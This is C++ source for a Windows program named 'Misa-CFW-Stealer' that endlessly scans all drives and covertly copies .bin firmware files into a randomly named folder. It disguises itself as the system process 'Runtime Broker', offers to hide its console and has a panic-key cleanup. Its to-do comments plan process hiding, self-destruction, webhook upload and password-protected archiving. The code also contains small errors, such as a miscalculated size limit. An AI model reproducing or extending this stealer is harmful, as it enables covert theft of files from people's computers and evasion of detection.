#define _CRT_SECURE_NO_WARNINGS
#include "color.h"
#include "filesystem"
#include "iostream"
#include "settings.h"
#include "util.h"
#include <random>  
#include <stack>
#include <string>   
#include <thread>    
#include <vector>    
#include <windows.h>
#include <random>
using namespace std::filesystem;

void grab_all_bins(const path& from, const path& to)
{
	for (const auto& entry : directory_iterator(from))
	{
		const auto& entry_path = entry.path();
		try
		{
			if (is_directory(entry.status()))
			{
				if ((entry_path.filename() != "Windows" || !settings::ignoreWindowsFolder) && entry_path.filename() != "$Recycle.Bin") {
					grab_all_bins(entry_path, to);
				}
			}
			else if (entry_path.extension() == ".bin")
			{
				if (file_size(entry_path) > 50 * 524 * 524) { // Limit size, im not sure how big firmware get so set at 50mb.
					continue;
				}

				path destination = to / entry_path.filename();
				try
				{
					copy(entry_path, destination, copy_options::overwrite_existing);
					std::cout << hue::grey << "File Copied: " << entry_path << destination << std::endl;
				}
				catch (filesystem_error& Error)
				{
					std::cout << hue::red << "Error Accessing Folder " << Error.what() << std::endl;
				}
			}
		}
		catch (filesystem_error& Error)
		{
			std::cout << hue::red << "Error Accessing Folder " << Error.what() << std::endl;
		}
	}
}

void helper() {
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);

	while (true)
	{
		if (GetAsyncKeyState(settings::panicKey) & 1)
		{
			cleanup();
		}
		Sleep(100);
	}
}

//To Do List:
//
//1. hide from task manager / Proccess list
//2. only grab newly created bins
//3. self distruct on exit
//4. upload bin(s) to webook
//5. add to winrar file thats password protected 

int main() {
	SetConsoleCtrlHandler((PHANDLER_ROUTINE)[](DWORD ctrlType) -> BOOL {
		if (ctrlType == CTRL_CLOSE_EVENT) {
			cleanup();
			return TRUE;
		}
		return FALSE;
		}, TRUE);


	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
	renameFile("Misa-CFW-Stealer.exe", "Runtime Broker.exe");

	std::cout << hue::white << "[+] " << hue::grey << "Ensure Program Is Placed In A Random Windows Folder!" << std::endl;
	Sleep(3000);
	system("cls");

	std::cout << hue::white << "[+] " << hue::grey << "Press " << hue::purple << "Insert " << hue::grey << "To Kill The Program At Anytime." << std::endl;
	Sleep(2500);
	system("cls");

	char decision;

	std::cout << hue::white << "[+] " << hue::grey << "Do You Want To Hide The Program?" << std::endl;
	std::cin >> decision;

	if (decision == 'y' || decision == 'Y' || decision == 'Yes' || decision == 'YES' || decision == 'yes')
	{
		std::cout << hue::white << "[+] " << hue::grey << "Program Hiding..." << std::endl;
		std::cout << hue::white << "[+] " << hue::grey << "Program Hidden!" << std::endl;
		Sleep(1000);
		FreeConsole();
	}
	else
	{
		std::cout << hue::white << "[+] " << hue::grey << "Program Hiding Skipped Continuing..." << std::endl;
		Sleep(500);
	}

	std::thread helper_thread(helper);


	// Creates a folder with a random name to put the bins in.
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> distr(1000, 9999);
	path random_folder_name = std::filesystem::current_path() / (std::to_string(distr(gen)));
	std::filesystem::create_directory(random_folder_name);

	SetConsoleTitleA("Runtime Broker");

	while (true) {
		DWORD drives = GetLogicalDrives();
		for (int i = 0; i < 26; ++i) {
			if (drives & (1 << i)) {
				char drive_letter = 'A' + i;
				path drive = std::string(1, drive_letter) + ":\\";
				grab_all_bins(drive, random_folder_name);
			}
		}
	}


	cleanup();
	return 0;
}


